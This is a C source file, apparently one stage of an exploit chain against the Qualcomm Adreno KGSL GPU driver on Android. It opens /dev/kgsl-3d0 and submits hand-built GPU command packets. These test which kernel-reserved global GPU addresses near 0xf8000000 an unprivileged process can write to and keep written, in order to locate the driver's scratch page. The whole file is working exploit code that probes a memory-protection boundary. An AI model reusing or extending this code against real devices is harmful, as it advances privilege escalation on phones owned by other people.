/*
 * kgsl_scratch_verify.c - stage 1b: verify the scratch global page address.
 *
 * Candidate globals (bump-allocated from 0xf8000000):
 *   setstate(4K) + memstore(32K) + [scratch(4K)] + per-RB descs...
 * Candidates tried in order: 0xf8009000, 0xf8008000, 0xf800a000, 0xf800b000.
 *
 * Test per candidate C:
 *   CP_MEM_WRITE(C+0x100, MAGIC)
 *   CP_WAIT_REG_MEM [0x13, C+0x100, MAGIC, 0xffffffff, 1]
 *   CP_MEM_WRITE(OUT, 1)          -> marker only if the wait observed MAGIC
 * Wrong candidates either fault (GPU recovery) or never show the marker.
 *
 * Build: zig cc -target aarch64-linux-musl -nostdlib -static -ffreestanding -fno-builtin -O2 -Wl,-e,_start -o kgsl_scratch_verify kgsl_scratch_verify.c
 */
typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long u64; typedef long s64;
#define SYS_openat 56
#define SYS_ioctl 29
#define SYS_write 64
#define SYS_exit 93
#define SYS_close 57
#define SYS_mmap 222
#define SYS_nanosleep 101
#define SYS_sched_yield 124
static inline s64 sys2(long n,s64 a,s64 b){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x8):"memory");return x0;}
static inline s64 sys3(long n,s64 a,s64 b,s64 c){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x8):"memory");return x0;}
static inline s64 sys4(long n,s64 a,s64 b,s64 c,s64 d){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x8):"memory");return x0;}
static inline s64 sys6(long n,s64 a,s64 b,s64 c,s64 d,s64 e,s64 f){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x4 __asm__("x4")=e;register s64 x5 __asm__("x5")=f;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5),"r"(x8):"memory");return x0;}
static int slen(const char*s){int n=0;while(s[n])n++;return n;}
static void out(const char*s){sys3(SYS_write,1,(s64)s,slen(s));}
static void outhex(u64 v){char b[19];b[0]='0';b[1]='x';for(int i=0;i<16;i++){int n=(v>>((15-i)*4))&0xf;b[2+i]=n<10?'0'+n:'a'+n-10;}b[18]=0;out(b);}
static void outdec(s64 v){char b[24];int i=23;b[i--]=0;int neg=v<0;if(neg)v=-v;if(v==0)b[i--]='0';while(v>0){b[i--]='0'+(v%10);v/=10;}if(neg)b[i--]='-';out(&b[i+1]);}
static void msleep(long ms){struct {long s,n;} ts; ts.s=ms/1000; ts.n=(ms%1000)*1000000L; sys2(SYS_nanosleep,(s64)&ts,0);}
#define _IOC_WRITE 1u
#define _IOC_READ 2u
#define IOC(dir,type,nr,size) (((dir)<<30)|((size)<<16)|((type)<<8)|(nr))
#define KGSL_MAGIC 0x09
struct kgsl_drawctxt_create{u32 flags;u32 drawctxt_id;};
#define IOCTL_DRAWCTXT_CREATE IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x13,sizeof(struct kgsl_drawctxt_create))
struct kgsl_gpumem_alloc_id{u32 id;u32 flags;u64 size;u64 mmapsize;u64 gpuaddr;u64 pad[2];};
#define IOCTL_GPUMEM_ALLOC_ID IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x34,sizeof(struct kgsl_gpumem_alloc_id))
struct kgsl_command_object{u64 offset;u64 gpuaddr;u64 size;u32 flags;u32 id;};
struct kgsl_gpu_command{u64 flags;u64 cmdlist;u32 cmdsize;u32 numcmds;u64 objlist;u32 objsize;u32 numobjs;u64 synclist;u32 syncsize;u32 numsyncs;u32 context_id;u32 timestamp;};
#define IOCTL_GPU_COMMAND IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x4A,sizeof(struct kgsl_gpu_command))
#define KGSL_CMDLIST_IB 0x1u
#define CP_WAIT_REG_MEM 0x3cu
#define CP_MEM_WRITE 0x3du
#define GLOBAL_BASE 0xf8000000ull
#define MAGIC 0xC0DEFACEu

static u32 parity(u32 v){v^=v>>4;v^=v>>8;v^=v>>12;v^=v>>16;v^=v>>20;v^=v>>24;v^=v>>28;return (0x9669u>>(v&0xf))&1u;}
static u32 pkt7(u32 op,u32 cnt){return 0x70000000u|(cnt&0x3fffu)|(parity(cnt)<<15)|((op&0x7fu)<<16)|(parity(op)<<23);}
static void dc_civac(void*p,u64 len){u64 a=(u64)p&~63ull,b=((u64)p+len+63)&~63ull;for(;a<b;a+=64)asm volatile("dc civac, %0"::"r"(a):"memory");asm volatile("dsb ish":::"memory");}
static u32*gcmd; static u32*gout; static long gfd; static u32 gdc,gcmdid,goutid; static u64 gcmd_gpu,gout_gpu;
static long submit(u32 cnt,u32 ts){
    dc_civac(gcmd,cnt*4);
    struct kgsl_command_object co; co.offset=0; co.gpuaddr=gcmd_gpu; co.size=cnt*4; co.flags=KGSL_CMDLIST_IB; co.id=gcmdid;
    struct kgsl_gpu_command gc; for(u64 i=0;i<sizeof(gc);i++)((u8*)&gc)[i]=0;
    gc.cmdlist=(u64)&co; gc.cmdsize=sizeof(co); gc.numcmds=1; gc.context_id=gdc; gc.timestamp=ts;
    return sys3(SYS_ioctl,gfd,IOCTL_GPU_COMMAND,(s64)&gc);
}
static long alloc_buf(u64 size,u32*id,u64*gpu,u32**cpu){
    struct kgsl_gpumem_alloc_id a; for(u64 i=0;i<sizeof(a);i++)((u8*)&a)[i]=0;
    a.size=size;
    long r=sys3(SYS_ioctl,gfd,IOCTL_GPUMEM_ALLOC_ID,(s64)&a);
    if(r) return r;
    *id=a.id; *gpu=a.gpuaddr; u64 mz=a.mmapsize?a.mmapsize:size;
    s64 m=sys6(SYS_mmap,0,mz,3,1,gfd,(s64)((u64)a.id<<12));
    if(m<=0) return -1;
    *cpu=(u32*)m; return 0;
}
void _start(void){
    out("[*] kgsl_scratch_verify\n");
    gfd=sys4(SYS_openat,-100,(s64)"/dev/kgsl-3d0",2,0);
    if(gfd<0){out("[!] open fail\n");sys3(SYS_exit,1,0,0);return;}
    struct kgsl_drawctxt_create d; d.flags=0x12u; d.drawctxt_id=0;
    if(sys3(SYS_ioctl,gfd,IOCTL_DRAWCTXT_CREATE,(s64)&d)||!d.drawctxt_id){out("[!] ctx fail\n");sys3(SYS_exit,1,0,0);return;}
    gdc=d.drawctxt_id;
    if(alloc_buf(0x1000,&gcmdid,&gcmd_gpu,&gcmd)){out("[!] cmd fail\n");sys3(SYS_exit,1,0,0);return;}
    if(alloc_buf(0x1000,&goutid,&gout_gpu,&gout)){out("[!] out fail\n");sys3(SYS_exit,1,0,0);return;}
    out("[1] cmd=");outhex(gcmd_gpu);out(" out=");outhex(gout_gpu);out("\n");

    u64 cands[4]={GLOBAL_BASE+0x9000ull, GLOBAL_BASE+0x8000ull, GLOBAL_BASE+0xA000ull, GLOBAL_BASE+0xB000ull};
    u32 ts=30;
    for(int i=0;i<4;i++){
        u64 c=cands[i];
        gout[0]=0xEEEEEEEEu; dc_civac(gout,4);
        u32 n=0;
        gcmd[n++]=pkt7(CP_MEM_WRITE,3); gcmd[n++]=(u32)(c+0x100); gcmd[n++]=(u32)((c+0x100)>>32); gcmd[n++]=MAGIC;
        gcmd[n++]=pkt7(CP_WAIT_REG_MEM,6); gcmd[n++]=0x13; gcmd[n++]=(u32)(c+0x100); gcmd[n++]=(u32)((c+0x100)>>32); gcmd[n++]=MAGIC; gcmd[n++]=0xFFFFFFFFu; gcmd[n++]=0x1;
        gcmd[n++]=pkt7(CP_MEM_WRITE,3); gcmd[n++]=(u32)gout_gpu; gcmd[n++]=(u32)(gout_gpu>>32); gcmd[n++]=0x1;
        long r=submit(n,ts++);
        int ok=0;
        for(int k=0;k<4000;k++){ dc_civac(gout,4); if(gout[0]==1){ok=1;break;} sys3(SYS_sched_yield,0,0,0); }
        out("[2] cand ");outhex(c);out(" ret=");outdec(r);out(ok?"  <== WRITABLE+PERSISTENT (scratch?)\n":"  (no marker)\n");
        if(ok){ out("[3] scratch candidate = ");outhex(c);out("\n"); break; }
        msleep(500);
    }
    out("[*] done\n");
    sys3(SYS_close,gfd,0,0);
    sys3(SYS_exit,0,0,0);
}
